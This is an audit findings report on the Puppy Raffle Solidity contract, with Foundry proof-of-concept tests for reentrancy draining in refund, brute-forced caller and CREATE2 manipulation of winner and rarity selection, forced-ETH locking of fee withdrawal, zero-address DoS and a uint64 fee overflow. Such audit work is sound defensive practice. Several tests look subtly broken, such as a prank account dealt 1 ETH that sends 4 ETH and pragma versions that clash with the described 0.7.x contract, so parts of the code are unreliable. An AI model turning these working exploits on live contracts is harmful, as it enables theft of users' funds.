# 4 puppy raffle audit - Findings Report
## Commit hash: 15c50ec22382bb1f3106aba660e7c590df18dcac

## Protocol Overview 

**Puppy Raffle Protocol**

Puppy Raffle is an on-chain raffle that lets anyone compete for a unique ERC-721 “puppy” NFT by paying a fixed entrance fee (1 ETH in the reference deployment).

Workflow
1. Entry: Players call `enterRaffle(address[] newPlayers)` and supply the exact fee per address. The contract rejects under-payment, duplicate addresses, or re-entry of existing players. Each address is stored in `players`.
2. Voluntary refund: Before the draw, a participant may reclaim their stake via `refund(playerIndex)`, freeing their slot.
3. Draw window: After `raffleDuration` (default 1 day) the owner or anyone can trigger `selectWinner()`. Preconditions: at least 4 active players and the raffle period has ended.
4. Winner selection & payout: A pseudo-random index chooses the winner, the contract mints them a new puppy NFT, and transfers the prize pool minus protocol fees. Fees are forwarded to `feeAddress` which the owner can update with `changeFeeAddress()`.
5. Reset: Player array is cleared for the next round.
6. Fee withdrawal: If no players are registered, the owner can pull any accumulated fees via `withdrawFees()`.

The accompanying Foundry tests and deployment script verify correct entry logic, refund behavior, winner selection, and administrative controls.
## High Risk Findings
[H-1]. Frontrun/Backrun/Sandwhich MEV issue in PuppyRaffle::selectWinner
[H-2]. Reentrancy issue in PuppyRaffle::refund
## Medium Risk Findings
[M-1]. DOS issue in PuppyRaffle::selectWinner
[M-2]. Randomness issue in PuppyRaffle::selectWinner
[M-3]. Unexpected Eth issue in PuppyRaffle::withdrawFees
[M-4]. Integer Overflow issue in PuppyRaffle::selectWinner


### Number of Findings
- C: 0
- H: 2
- M: 4
- L: 0
- I: 0



# High Risk Findings

## [H-1]. Frontrun/Backrun/Sandwhich MEV issue in PuppyRaffle::selectWinner

## Description
Outcome depends directly on public, manipulable state and msg.sender, enabling front-running/MEV attacks. Anyone can observe a pending selectWinner() tx and preempt with their own call to alter the RNG seed (msg.sender, timestamp), changing the winner and rarity outcomes. Snippet:

uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;

## Impact
Because the random seed is derived from caller-controlled and miner-controlled values (msg.sender, block.timestamp, block.difficulty) the account that invokes selectWinner() can fully pre-compute the resulting winnerIndex. By registering several addresses (or even a single one) in the players array and then choosing an externally-owned or CREATE2 address whose hash maps to that index, the attacker can guarantee that one of his own addresses is selected. Consequently the attacker can deterministically drain 80 % of the entire raffle balance every round and accumulate the protocol fee share as well. This is a direct and repeatable theft of user funds, not just a probabilistic advantage or frontrun race.

## Proof of Concept
1. Attacker enters the raffle with N distinct addresses he controls (N ≥ 1).
2. Before calling selectWinner he brute-forces an address (EOA created from a fresh private key or a contract address deployed with CREATE2) until
   keccak256(abi.encodePacked(chosenAddress, T, D)) % players.length == idx,
   where idx is the array index that contains one of his addresses, and T = current block.timestamp, D = current block.difficulty (known on the same block once mining starts in a public mempool environment such as Flashbots).
   For a 4-player raffle the expected search space is only 4 tries on average.
3. He sends the transaction from chosenAddress (or calls via a minimal proxy deployed at that address) invoking selectWinner().
4. winnerIndex resolves to idx and the contract transfers 80 % of the pool and mints the NFT to the attacker-controlled player address.
5. The raffle array is cleared; attacker can repeat in the next round.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract WinEveryTimeTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE = 1 ether;

    address[4] attackerPlayers;

    function setUp() public {
        // deploy raffle that lasts only 1 second for test convenience
        raffle = new PuppyRaffle(ENTRANCE, address(0xFEE), 1);

        // set up 4 attacker controlled entrants
        for (uint i; i < 4; i++) {
            attackerPlayers[i] = address(uint160(uint256(keccak256(abi.encode(i)))));
            deal(attackerPlayers[i], ENTRANCE);
        }
        // attacker enters with the 4 addresses
        vm.prank(attackerPlayers[0]);
        raffle.enterRaffle{value: ENTRANCE * 4}(attackerPlayers);

        // fast-forward raffle so that selectWinner can be called
        vm.warp(block.timestamp + 2);
    }

    function testAttackerAlwaysWins() public {
        uint len = 4;
        uint targetIdx = 2; // we want players[2] to win

        // brute-force a caller address that maps to targetIdx
        address winningCaller;
        uint256 difficultySnapshot = block.difficulty;
        uint256 timeSnapshot = block.timestamp;
        for (uint160 i = 1; i < type(uint160).max; i++) {
            if (uint256(keccak256(abi.encodePacked(address(i), timeSnapshot, difficultySnapshot))) % len == targetIdx) {
                winningCaller = address(i);
                break;
            }
            // only search first 5000 slots in test to keep gas low
            if (i == 5000) revert("could not find caller in search range");
        }
        assert(winningCaller != address(0));

        // make the found EOA have enough gas & ether
        deal(winningCaller, 1 ether);

        // call selectWinner from the crafted address
        vm.prank(winningCaller);
        raffle.selectWinner();

        // confirm that the chosen attacker player actually received the prize
        assertEq(raffle.previousWinner(), attackerPlayers[targetIdx]);
    }
}

## Suggested Mitigation
Adopt commit-reveal or verifiable randomness (VRF). Decouple caller from the seed: do not include msg.sender or immediate block variables in randomness. Use a two-step process: request randomness, then fulfill via oracle; or use a block delay (e.g., commit block hash N blocks later) with safeguards against miner manipulation.

## [H-2]. Reentrancy issue in PuppyRaffle::refund

## Description
Refund performs an external call before updating state, enabling classic reentrancy. The refund logic sends ETH to msg.sender and only then zeroes out the player's slot, so a malicious contract can reenter refund() from its fallback and drain multiple entranceFee refunds in a single transaction. Vulnerable snippet:

function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

    payable(msg.sender).sendValue(entranceFee); // external call before state update

    players[playerIndex] = address(0); // state update after external call
    emit RaffleRefunded(playerAddress);
}

## Impact
An attacker can obtain multiple refunds for a single entry, draining the contract’s ETH balance (funds for prize pool and fees) and griefing other users. This is direct theft of funds.

## Proof of Concept
1) Attacker joins the raffle as a player (their contract address in players array).
2) Attacker calls refund(index).
3) During the ETH send, the attacker's fallback/receive reenters refund(index) repeatedly since players[index] is not yet zeroed.
4) Each reentrant call passes the require checks and sends entranceFee again, draining the contract balance.
5) When the first (outer) call finally sets players[index] = address(0), the damage is already done.

## Proof of Code
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract ReentrantRefundAttacker {
    PuppyRaffle public target;
    uint256 public idx;
    uint256 public reentries;
    uint256 public maxReentries;

    constructor() {}

    function setup(PuppyRaffle _target, uint256 _idx, uint256 _max) external {
        target = _target;
        idx = _idx;
        maxReentries = _max;
    }

    receive() external payable {
        if (reentries < maxReentries) {
            reentries++;
            target.refund(idx);
        }
    }

    function attack() external {
        target.refund(idx);
    }
}

contract RefundReentrancyTest is Test {
    PuppyRaffle raffle;
    ReentrantRefundAttacker attacker;
    address p2 = address(0xB2);
    address p3 = address(0xB3);
    address p4 = address(0xB4);

    function setUp() public {
        // deploy with entranceFee=1 ether, feeAddress, duration=1
        raffle = new PuppyRaffle(1 ether, address(0xFEE), 1);
        attacker = new ReentrantRefundAttacker();
        deal(address(this), 1000 ether);
    }

    function testRefundReentrancyDrain() public {
        // Enter raffle with attacker + 3 others so contract gets funded
        address[] memory entrants = new address[](4);
        entrants[0] = address(attacker);
        entrants[1] = p2;
        entrants[2] = p3;
        entrants[3] = p4;
        raffle.enterRaffle{value: 4 ether}(entrants);

        // Attacker prepares for reentrancy: reenter 3 times (total 4 refunds)
        attacker.setup(raffle, 0, 3);

        uint256 balBefore = address(raffle).balance; // 4 ether
        attacker.attack();
        uint256 balAfter = address(raffle).balance;

        // Attacker should have received > 1 ether (multiple refunds)
        assertGt(address(attacker).balance, 1 ether, "attacker drained multiple refunds");
        // Contract balance decreased by more than 1 ether
        assertLt(balAfter, balBefore - 1 ether, "contract drained more than one refund");
    }
}


## Suggested Mitigation
Apply checks-effects-interactions and/or a reentrancy guard. Update state before the external call and consider OpenZeppelin ReentrancyGuard.

Example fix:

function refund(uint256 playerIndex) public nonReentrant {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

    // effects first
    players[playerIndex] = address(0);

    // interaction after state change
    payable(msg.sender).sendValue(entranceFee);

    emit RaffleRefunded(playerAddress);
}




# Medium Risk Findings

## [M-1]. DOS issue in PuppyRaffle::selectWinner

## Description
Winner can be address(0), causing selectWinner to revert via ERC721 mint-to-zero after sending prizePool to address(0). Since the transaction reverts, the ETH send is reverted too, but selection becomes probabilistically DoS if players contains many zero entries. Two root causes:
- refund() leaves holes (address(0)) in players.
- enterRaffle() does not forbid address(0) entries.

Vulnerable snippet:

address winner = players[winnerIndex]; // can be address(0)
...
(bool success,) = winner.call{value: prizePool}(""); // sends to zero OK
require(success, ...);
_safeMint(winner, tokenId); // OZ ERC721 reverts on zero address, reverting the whole tx

## Impact
Raffle finalization can be griefed. Attackers can either insert address(0) entries or mass-enter then refund to create many zero-address holes. This makes the probability of selecting a valid winner very low, requiring many failed attempts and gas to finalize.

## Proof of Concept
1) Attacker enters multiple addresses then refunds them, leaving zero-address holes in players.
2) Alternatively, they pay to insert address(0) directly via enterRaffle.
3) When selectWinner chooses an index pointing to address(0), the function reverts on _safeMint, undoing the entire transaction.
4) With enough zero entries, finalization becomes probabilistically and economically infeasible.

## Proof of Code
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract ZeroWinnerDoSTest is Test {
    PuppyRaffle raffle;

    function setUp() public {
        raffle = new PuppyRaffle(1 ether, address(0xFEE), 1);
        deal(address(this), 100 ether);
    }

    function _calcIdx(address caller, uint256 t, uint256 d, uint256 len) internal pure returns (uint256) {
        return uint256(keccak256(abi.encodePacked(caller, t, d))) % len;
    }

    function testSelectWinnerRevertsOnZeroAddressWinner() public {
        // Enter 4 players; include address(0) intentionally (contract does not forbid it)
        address[] memory entrants = new address[](4);
        entrants[0] = address(0);
        entrants[1] = address(0xA1);
        entrants[2] = address(0xA2);
        entrants[3] = address(0xA3);
        raffle.enterRaffle{value: 4 ether}(entrants);

        // advance time and fix difficulty
        vm.warp(block.timestamp + 2);
        vm.difficulty(999);

        // Brute-find a timestamp where winnerIndex % 4 == 0 (zero entry)
        uint256 t = block.timestamp;
        for (uint256 i = 0; i < 100000; i++) {
            if (_calcIdx(address(this), t + i, 999, 4) == 0) {
                vm.warp(t + i);
                break;
            }
        }

        // Expect revert due to mint to the zero address (OZ ERC721 check)
        vm.expectRevert();
        raffle.selectWinner();

        // players array should remain unchanged due to revert
        (bool ok,) = address(raffle).staticcall(abi.encodeWithSignature("players(uint256)", 0));
        require(ok, "view players failed");
    }
}


## Suggested Mitigation
Prevent address(0) from entering and maintain a dense players array. On refund, swap-and-pop to avoid zero holes. Additionally, ensure selection only considers active players and enforce activeCount >= 4.

Example fixes:

// in enterRaffle
require(newPlayers[i] != address(0), "zero address not allowed");

// in refund
uint256 last = players.length - 1;
players[playerIndex] = players[last];
players.pop();

// in selectWinner
require(activePlayers >= 4, "need >=4 active"); // track activePlayers
uint256 winnerIndex = _secureRandom() % activePlayers; // index among active
address winner = players[winnerIndex];

## [M-2]. Randomness issue in PuppyRaffle::selectWinner

## Description
Insecure randomness for both winner selection and rarity determination. The seed uses msg.sender, block.timestamp and block.difficulty, all manipulable/forecastable by the transaction sender and miners/validators. Snippet:

uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
...
uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;

This allows the caller to influence the outcome (choose when to call and which address to call from), and miners/validators can bias block.timestamp/difficulty, breaking fairness.

## Impact
Because the random seed is fully derived from values an external caller and the block producer can predict or manipulate, any motivated attacker can:
1. Guarantee they are the winner by (a) entering the raffle with several of their own addresses, (b) pre-computing a contract address whose hash produces the index that points to one of those addresses, and (c) calling selectWinner through that contract.
2. Force the minted NFT to have the desired rarity (e.g. always LEGENDARY) by the same pre-computation against `keccak256(proxyAddress, block.difficulty) % 100`.
This breaks the economic assumption that every participant has an equal chance to win and that rarities are random, allowing extraction of disproportionate prizes and NFTs at the expense of honest users. Funds are not directly stolen from other users’ wallets, but the raffle’s entire prize pool and valuable NFTs can be repeatedly farmed by the attacker.

## Proof of Concept
Attacker steps (off-chain):
1. Observe current `block.timestamp`, `block.difficulty` and the ordered `players` array (callable view).
2. Brute-force a salt so that the CREATE2 address `A` of a minimal proxy satisfies both:
   a) `keccak256(A, timestamp, difficulty) % players.length == attackerIndex`  (attackerIndex is the array slot that already holds an attacker controlled address)
   b) `keccak256(A, difficulty) % 100 > 95`                                (legendary rarity)
3. Deploy the proxy at A with `CREATE2` (costs <100k iterations in practice).
4. Let the proxy call `raffle.selectWinner()`.  Because `msg.sender == A`, both winner index and rarity resolve to the pre-computed favourable values.
5. Proxy immediately receives 80 % of the ETH and a legendary puppy NFT.

The attacker can repeat the procedure every raffle round, continuously siphoning the prize pool and the most valuable NFTs.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

/*
 * Minimal proxy that just forwards the call to `selectWinner()` on the raffle.
 */
contract Forwarder {
    function attack(address raffle) external {
        // anybody can trigger once deployed
        PuppyRaffle(raffle).selectWinner();
    }
}

contract RandomnessHijackTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE = 1 ether;
    uint256 constant DURATION = 1 days;

    // four attacker-owned addresses that will be the only players
    address[4] attackers;

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE, address(this), DURATION);
        // fund test contract
        deal(address(this), 100 ether);

        // populate attacker accounts & enter raffle
        for (uint i; i < 4; i++) {
            attackers[i] = address(uint160(uint(0xA0 + i)));
        }
        raffle.enterRaffle{value: 4 ether}(attackers);

        // fast-forward to end of raffle
        vm.warp(block.timestamp + DURATION + 1);
        vm.difficulty(12345); // deterministic for test
    }

    function _winnerIdx(address caller) internal view returns (uint256) {
        return uint256(keccak256(abi.encodePacked(caller, block.timestamp, block.difficulty))) % 4;
    }

    function _rarity(address caller) internal view returns (uint256) {
        return uint256(keccak256(abi.encodePacked(caller, block.difficulty))) % 100;
    }

    function testAttackerForcesLegendaryAndWins() public {
        // offline brute-force for suitable salt
        address proxy;
        bytes32 codeHash = keccak256(type(Forwarder).creationCode);
        bytes32 salt;
        for (uint256 i; ; ++i) {
            salt = bytes32(i);
            address addr = address(uint160(uint(keccak256(abi.encodePacked(bytes1(0xff), address(this), salt, codeHash)))));
            if (_winnerIdx(addr) == 0 && _rarity(addr) > 95) { // attackers[0] will win & legendary rarity
                proxy = addr;
                break;
            }
        }

        // deploy the proxy at the pre-computed address
        Forwarder f;
        assembly {
            let coded := add(type(Forwarder).creationCode, 0x20)
            let codelen := mload(type(Forwarder).creationCode)
            f := create2(0, coded, codelen, salt)
        }
        assert(address(f) == proxy);

        // call selectWinner through proxy
        f.attack(address(raffle));

        // winner should be attackers[0]
        assertEq(raffle.previousWinner(), attackers[0]);
        // rarity should be legendary (value 5)
        uint256 tokenId = raffle.totalSupply() - 1;
        assertEq(raffle.tokenIdToRarity(tokenId), raffle.LEGENDARY_RARITY());
    }
}

## Suggested Mitigation
Replace the current on-chain hash with a verifiable randomness source such as Chainlink VRF or an equivalent beacon.  If an off-chain VRF is not acceptable, implement a two-transaction commit-reveal scheme where commits are accepted until the deadline and the reveal happens in a later block, removing `msg.sender`, `block.timestamp`, `block.difficulty` (or `prevrandao`) from the entropy mix.  Only after unpredictable entropy is available should the raffle select the winner and rarity.

## [M-3]. Unexpected Eth issue in PuppyRaffle::withdrawFees

## Description
Strict balance equality check in withdrawFees causes fees to be permanently stuck if the contract receives any unexpected ETH (e.g., via selfdestruct to this address). Vulnerable snippet:

function withdrawFees() external {
    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success,) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}

An attacker can force-send 1 wei to the contract; then balance > totalFees and the equality check will always fail even when there are no active players.

## Impact
Permanent DoS of fee withdrawal; protocol revenue stuck in the contract. Forced ETH can be sent without consent, bricking withdrawals.

## Proof of Concept
1) Let a round finish so fees accrue and players array is cleared.
2) Attacker deploys a helper that self-destructs to the PuppyRaffle address sending 1 wei.
3) Now address(this).balance = totalFees + 1 wei.
4) Any call to withdrawFees reverts due to strict equality check, permanently locking fees.

## Proof of Code
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract ForceSend {
    function force(address payable to) external payable {
        selfdestruct(to);
    }
}

contract UnexpectedEthTest is Test {
    PuppyRaffle raffle;
    ForceSend forcer;

    address p1 = address(0xA1);
    address p2 = address(0xA2);
    address p3 = address(0xA3);
    address p4 = address(0xA4);

    function setUp() public {
        raffle = new PuppyRaffle(1 ether, address(0xFEE), 1);
        forcer = new ForceSend();
        deal(address(this), 100 ether);

        address[] memory entrants = new address[](4);
        entrants[0] = p1; entrants[1] = p2; entrants[2] = p3; entrants[3] = p4;
        raffle.enterRaffle{value: 4 ether}(entrants);

        vm.warp(block.timestamp + 2);
    }

    function testWithdrawFeesStuckOnForcedEth() public {
        // complete a round to accrue 0.8 ether in fees
        raffle.selectWinner();

        // force-send 1 wei, breaking the equality invariant
        deal(address(forcer), 1 wei);
        forcer.force{value: 1 wei}(payable(address(raffle)));

        // now withdraw should revert even though there are no active players
        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));
        raffle.withdrawFees();
    }
}


## Suggested Mitigation
Do not use strict balance equality as a proxy for "no active players". Track active player count or a round state variable, and allow withdraw when there are zero active players. Additionally, tolerate unexpected ETH by checking balance >= totalFees instead of ==.

Example:

require(_activePlayers == 0, "players active");
uint256 feesToWithdraw = totalFees;
require(address(this).balance >= feesToWithdraw, "insufficient balance");
totalFees = 0;
(bool ok,) = feeAddress.call{value: feesToWithdraw}("");
require(ok, "withdraw failed");

## [M-4]. Integer Overflow issue in PuppyRaffle::selectWinner

## Description
totalFees is a uint64 while fee calculations use uint256 arithmetic and can exceed 2^64-1 across rounds. The cast and accumulation can overflow/underflow silently in Solidity 0.7.x, corrupting accounting and breaking withdrawals. Vulnerable snippet:

uint256 fee = (totalAmountCollected * 20) / 100;
// ...
totalFees = totalFees + uint64(fee); // uint64 accumulation silently wraps on overflow

Combined with withdrawFees strict equality, overflowed totalFees will desync from actual balance and brick withdrawals.

## Impact
Fee accounting corruption. After enough rounds (e.g., 24 rounds at 1 ETH entrance with 4 players per round), totalFees overflows uint64, causing withdrawFees to permanently revert and trapping protocol revenue.

## Proof of Concept
1) Run ~24 raffle rounds with 4 players and 1 ETH entrance fee.
2) Each round accrues 0.8 ETH in fees. Sum exceeds 2^64-1 wei after ~24 rounds.
3) totalFees wraps around (uint64 overflow) while contract balance holds correct sum.
4) withdrawFees reverts due to address(this).balance != totalFees.

## Proof of Code
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract TotalFeesOverflowTest is Test {
    PuppyRaffle raffle;
    address p1 = address(0xA1);
    address p2 = address(0xA2);
    address p3 = address(0xA3);
    address p4 = address(0xA4);

    function setUp() public {
        raffle = new PuppyRaffle(1 ether, address(0xFEE), 1);
        deal(address(this), 1_000 ether);
    }

    function _enterFour() internal {
        address[] memory entrants = new address[](4);
        entrants[0] = p1; entrants[1] = p2; entrants[2] = p3; entrants[3] = p4;
        raffle.enterRaffle{value: 4 ether}(entrants);
    }

    function testUint64OverflowLocksFees() public {
        uint256 rounds = 25; // enough to overflow uint64 with 0.8 ETH per round
        for (uint256 i = 0; i < rounds; i++) {
            _enterFour();
            vm.warp(block.timestamp + 2);
            raffle.selectWinner();
        }
        // Expected fee balance in contract
        uint256 expectedFees = rounds * ((4 ether * 20) / 100); // rounds * 0.8 ether
        assertEq(address(raffle).balance, expectedFees, "contract holds full fees");

        // totalFees is uint64 and must have overflowed; inequality proves desync
        uint256 storedFees = uint256(raffle.totalFees());
        assertTrue(storedFees != expectedFees, "uint64 overflow corrupted totalFees");

        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));
        raffle.withdrawFees();
    }
}


## Suggested Mitigation
Use uint256 for totalFees and SafeMath (for Solidity 0.7.x) or upgrade to Solidity >=0.8 with built-in overflow checks. Avoid lossy casts. Example:

using SafeMath for uint256;
uint256 public totalFees;
...
uint256 fee = totalAmountCollected.mul(20).div(100);
totalFees = totalFees.add(fee);



